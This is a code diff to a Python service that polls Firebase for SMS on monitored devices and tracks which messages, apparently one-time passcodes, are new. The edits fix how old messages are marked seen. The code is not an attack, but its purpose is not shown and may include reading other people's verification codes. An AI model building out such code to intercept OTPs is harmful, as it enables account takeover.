@@ -109,6 +109,7 @@ SEEN_META_KEY = "firebase_sms_seen"
 INJECT_DONE_META_KEY = "firebase_sms_inject_done"
 BASELINE_META_KEY = "firebase_sms_baseline"
 BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
+BASELINE_READY_META_KEY = "firebase_sms_baseline_ready"
 MESSAGES_HIGH_WATER_META = "firebase_messages_high_water"
 SMS_PATHS_META_KEY = "firebase_sms_paths"
 MAX_SEEN_KEYS = 20000
@@ -161,7 +162,10 @@ def _meta_dict(device: Device) -> dict[str, Any]:
 
 
 def _save_meta(device: Device, meta: dict[str, Any]) -> None:
+    from sqlalchemy.orm.attributes import flag_modified
+
     device.device_meta = json.dumps(meta)
+    flag_modified(device, "device_meta")
 
 
 def get_seen_sms_keys(device: Device) -> set[str]:
@@ -239,10 +243,44 @@ def clear_sms_baseline(device: Device) -> None:
     meta = _meta_dict(device)
     meta.pop(BASELINE_META_KEY, None)
     meta.pop(BASELINE_AT_META_KEY, None)
+    meta.pop(BASELINE_READY_META_KEY, None)
     meta.pop(SEEN_META_KEY, None)
     meta.pop(MESSAGES_HIGH_WATER_META, None)
     meta.pop(INJECT_DONE_META_KEY, None)
     _save_meta(device, meta)
+
+
+def _leaf_push_int(firebase_key: str) -> int | None:
+    leaf = firebase_key.rsplit("/", 1)[-1]
+    try:
+        return int(leaf)
+    except ValueError:
+        return None
+
+
+def _old_message_keys_for_baseline(shallow: set[str], high_water: int) -> set[str]:
+    """Only pre-monitoring keys — never mark new Firebase SMS as seen."""
+    old: set[str] = set()
+    for key in shallow:
+        push = _leaf_push_int(key)
+        if push is not None:
+            if push <= high_water:
+                old.add(key)
+        else:
+            old.add(key)
+    return old
+
+
+def _monitoring_baseline_done(device: Device, profile: MonitorProfile) -> bool:
+    started = _started_iso(profile.started_at)
+    if not started:
+        return False
+    meta = _meta_dict(device)
+    return (
+        meta.get(BASELINE_AT_META_KEY) == started
+        and meta.get(BASELINE_READY_META_KEY) is True
+        and int(meta.get(MESSAGES_HIGH_WATER_META) or 0) > 0
+    )
 
 
 def _message_leaf_key(record: dict[str, Any]) -> str | None:
@@ -298,6 +336,7 @@ def _set_baseline_high_water(
     meta[BASELINE_META_KEY] = []
     if started_at:
         meta[BASELINE_AT_META_KEY] = _started_iso(started_at)
+    meta[BASELINE_READY_META_KEY] = True
     _save_meta(device, meta)
 
 
@@ -999,15 +1038,10 @@ async def snapshot_firebase_sms_seen(
             )
             shallow = await _fetch_messages_shallow_keys(root, device_id, SNAPSHOT_TIMEOUT_SEC)
             all_seen |= shallow
-            for key in shallow:
-                leaf = key.rsplit("/", 1)[-1]
-                try:
-                    high_water = max(high_water, int(leaf))
-                except ValueError:
-                    continue
-        if all_seen:
-            mark_sms_keys_seen(device, all_seen)
-            ignored = len(all_seen)
+        if all_seen and high_water > 0:
+            old_seen = _old_message_keys_for_baseline(all_seen, high_water)
+            mark_sms_keys_seen(device, old_seen)
+            ignored = len(old_seen)
     except (asyncio.TimeoutError, httpx.HTTPError) as exc:
         logger.warning("Firebase SMS baseline fetch failed for %s: %s", device.name, exc)
         _set_baseline_high_water(device, 0, profile.started_at)
@@ -1032,6 +1066,9 @@ def mark_monitoring_baseline_started(device: Device, profile: MonitorProfile, db
     meta = _meta_dict(device)
     meta.pop(SEEN_META_KEY, None)
     meta.pop(BASELINE_META_KEY, None)
+    meta.pop(BASELINE_READY_META_KEY, None)
+    meta.pop(MESSAGES_HIGH_WATER_META, None)
+    meta.pop(INJECT_DONE_META_KEY, None)
     if profile.started_at:
         meta[BASELINE_AT_META_KEY] = _started_iso(profile.started_at)
     _save_meta(device, meta)
@@ -1148,13 +1185,8 @@ async def _ensure_messages_high_water(
     db,
 ) -> int:
     """First poll cycle — lock current Firebase tail without delivering backlog."""
-    hw = _messages_high_water(device)
-    started = _started_iso(profile.started_at)
-    meta = _meta_dict(device)
-    baseline_at = meta.get(BASELINE_AT_META_KEY)
-    seen_count = len(get_seen_sms_keys(device))
-    if hw > 0 and baseline_at == started and seen_count > 0:
-        return hw
+    if _monitoring_baseline_done(device, profile):
+        return _messages_high_water(device)
 
     root = firebase_root_url(firebase_url)
     device_id = (device.name or "").strip()
@@ -1173,26 +1205,21 @@ async def _ensure_messages_high_water(
         if push_ids:
             high_water = max(push_ids)
 
+    shallow: set[str] = set()
     try:
         shallow = await _fetch_messages_shallow_keys(root, device_id, fetch_timeout)
-        if shallow:
-            mark_sms_keys_seen(device, shallow)
-            for key in shallow:
-                leaf = key.rsplit("/", 1)[-1]
-                try:
-                    high_water = max(high_water, int(leaf))
-                except ValueError:
-                    continue
+        if shallow and high_water > 0:
+            mark_sms_keys_seen(device, _old_message_keys_for_baseline(shallow, high_water))
     except Exception:
         shallow = set()
 
     _set_baseline_high_water(device, high_water, profile.started_at)
     db.commit()
     logger.info(
-        "OTP high_water init device=%s high_water=%s seen_keys=%s (lock tail, no bulk)",
+        "OTP baseline locked device=%s high_water=%s old_seen=%s",
         device_id,
         high_water,
-        len(shallow),
+        len(_old_message_keys_for_baseline(shallow, high_water)) if shallow and high_water else 0,
     )
     return high_water
 
